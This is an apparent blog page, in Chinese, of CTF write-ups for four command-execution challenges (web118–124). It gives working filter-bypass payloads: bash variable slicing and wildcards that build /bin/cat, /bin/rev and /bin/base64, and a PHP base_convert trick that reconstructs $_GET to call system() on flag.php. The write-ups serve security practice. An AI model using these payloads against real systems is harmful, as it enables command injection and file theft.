@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web118开启容器 代码审计  有一个&lt;!-- system($code);--&gt; 12345678$PWD和$&#123;PWD&#125;    表示当前所在的目录	&#x2F;var&#x2F;www&#x2F;html$&#123;#PWD&#125;         13		前面加个#表示当前目录字符串长度$&#123;PWD:3&#125;        r&#x2F;www&#x2F;html	代表从第几位开始截取到后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web118-122&amp;124">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web118开启容器 代码审计  有一个&lt;!-- system($code);--&gt; 12345678$PWD和$&#123;PWD&#125;    表示当前所在的目录	&#x2F;var&#x2F;www&#x2F;html$&#123;#PWD&#125;         13		前面加个#表示当前目录字符串长度$&#123;PWD:3&#125;        r&#x2F;www&#x2F;html	代表从第几位开始截取到后">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320102304976.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320103713962.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320104416114.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320104513243.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320104655021.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320110320939.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320110457225.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320110752545.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320111455165.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320111544965.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320111651953.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320112854530.png">
+<meta property="article:published_time" content="2025-03-20T02:17:49.000Z">
+<meta property="article:modified_time" content="2025-03-20T03:28:57.653Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/03/20/web118-122-124/file-20250320102304976.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web118-122&amp;124</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/18/web116-117/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/20/web118-122-124/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&text=web118-122&amp;124"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&is_video=false&description=web118-122&amp;124"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web118-122&amp;124&body=Check out this article: https://youngking-gfy.github.io/2025/03/20/web118-122-124/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&name=web118-122&amp;124&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&t=web118-122&amp;124"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web118"><span class="toc-number">1.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web119"><span class="toc-number">2.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web122"><span class="toc-number">3.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web124"><span class="toc-number">4.</span> <span class="toc-text">web124</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web118-122&amp;124
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-20T02:17:49.000Z" class="dt-published" itemprop="datePublished">2025-03-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320102304976.png"></p>
+<p>有一个<code>&lt;!-- system($code);--&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$PWD和$&#123;PWD&#125;    表示当前所在的目录	/var/www/html</span><br><span class="line">$&#123;#PWD&#125;         13		前面加个#表示当前目录字符串长度</span><br><span class="line">$&#123;PWD:3&#125;        r/www/html	代表从第几位开始截取到后面的所有字符（从零开始）</span><br><span class="line">$&#123;PWD:~3&#125;    	html	代表从最后面开始向前截取几位（从零开始）</span><br><span class="line">$&#123;PWD:3:1&#125;     	r</span><br><span class="line">$&#123;PWD:~3:1&#125; 	h</span><br><span class="line">$&#123;PWD:~A&#125;		l	这里的A其实就是表示1</span><br><span class="line">$&#123;SHLVL:~A&#125; 	1	代表数字1</span><br></pre></td></tr></table></figure>
+
+<p><code>code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code><br><code>nl ????.???</code><br><img src="/2025/03/20/web118-122-124/file-20250320103713962.png"></p>
+<h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>开启容器</p>
+<p>一样的前端</p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320104416114.png"></p>
+<p><code>code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code><br><code>nl ????.???</code></p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320104513243.png"></p>
+<p>无法成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line"></span><br><span class="line">就是/???/??t ????.???</span><br><span class="line"></span><br><span class="line">就是/bin/cat flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/20/web118-122-124/file-20250320104655021.png"></p>
+<p>罗列可疑代替</p>
+<ul>
+<li>0：可以用字符代替；  </li>
+<li>1：<code>$</code>、<code>$</code>代替1。</li>
+</ul>
+<p>这次可以用<code>/bin/rev</code>读取，rev命令可以实现文件文本行,或字符串的反序显示。那么需要获取<code>/</code>和<code>r</code>字符，或者 <code>v</code>。</p>
+<p>构造&#x2F;???&#x2F;??v：<br><code>code=$&#123;PWD::$&#125;???$&#123;PWD::$&#125;$&#123;PWD:$&#125;?? ????.???</code></p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320110320939.png"></p>
+<p>输出反序flag<br><img src="/2025/03/20/web118-122-124/file-20250320110457225.png"></p>
+<h3 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320110752545.png"></p>
+<p>这次PWD被过滤了，但是HOME可以用了。</p>
+<p>这次可以用命令<code>/bin/base64</code>。因为，<code>$&#123;RANDOM&#125;</code>可以出现4或5，可以构造<code>/???/?????4</code>。需要多试几次才能拿到flag。</p>
+<p>payload：<code>code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</code></p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320111455165.png"></p>
+<p>刷了好几次</p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320111544965.png"></p>
+<h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320111651953.png"></p>
+<p>绕过<br>我们想要让他执行命令，如system($cmd)。为了绕过对字符的限制，可以用get或post再次传参，用白名单的字符串作为参数名。</p>
+<p>我们需要两个参数，一个传递函数名，一个传递函数参数值。（这里选择_GET，因为长度短，题目中有长度限制）<br><code>$_GET[abs]($_GET[acos]);</code><br>也就是<code>c=$_GET[abs]($_GET[acos]);&amp;abs=system&amp;acos=ls</code><br>黑名单有中括号，可以用大括号<code>&#123;&#125;</code>代替<code>c=$_GET&#123;abs&#125;($_GET&#123;acos&#125;);&amp;abs=system&amp;acos=ls</code></p>
+<p>构造<code>_GET</code>。因为白名单的限制，<code>_GET</code>不能直接用，需要构造。<br><code>_GET</code>转成十六进制是0x5f474554，由十六进制转为十进制1598506324。</p>
+<p>可以利用数学函数，由十进制转成字符。这需要用到两个函数dechex()、hex2bin()。<br><code>_GET</code>&#x3D;<code>hex2bin(dechex(1598506324))</code></p>
+<blockquote>
+<p>dechex()：十进制转十六进制<br>  hex2bin()：十六进制转二进制，返回 ASCII 字符</p>
+</blockquote>
+<p>但是第二个函数hex2bin，白名单里没有，不过白名单里有一个base_convert。</p>
+<blockquote>
+<p>base_convert(number,frombase,tobase)：可以在任意进制之间转换数字</p>
+</blockquote>
+<p><code>base_convert(&#39;hex2bin&#39;,36,10)</code>&#x3D;&gt;37907361743<br><code>base_convert(37907361743,10,36)</code>&#x3D;&gt;hex2bin</p>
+<blockquote>
+<p>这里base_convert为什么写36进制，是因为数字一共10个，字母（不区分大小写）一共26个，为了能把所有字符都表示进来，就是10+26&#x3D;36。</p>
+</blockquote>
+<p>所以<code>_GET</code>&#x3D;<code>base_convert(37907361743,10,36)(dechex(1598506324))</code></p>
+<p>设置一个变量等于_GET，挑一个白名单里最短的pi作为变量名：<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))</code>,之后引用<code>$pi</code>即可</p>
+<p>payload：<code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs=system&amp;acos=cat flag.php</code></p>
+<p><img src="/2025/03/20/web118-122-124/file-20250320112854530.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web118"><span class="toc-number">1.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web119"><span class="toc-number">2.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web122"><span class="toc-number">3.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web124"><span class="toc-number">4.</span> <span class="toc-text">web124</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/20/web118-122-124/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&text=web118-122&amp;124"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&is_video=false&description=web118-122&amp;124"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web118-122&amp;124&body=Check out this article: https://youngking-gfy.github.io/2025/03/20/web118-122-124/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&title=web118-122&amp;124"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&name=web118-122&amp;124&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/20/web118-122-124/&t=web118-122&amp;124"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
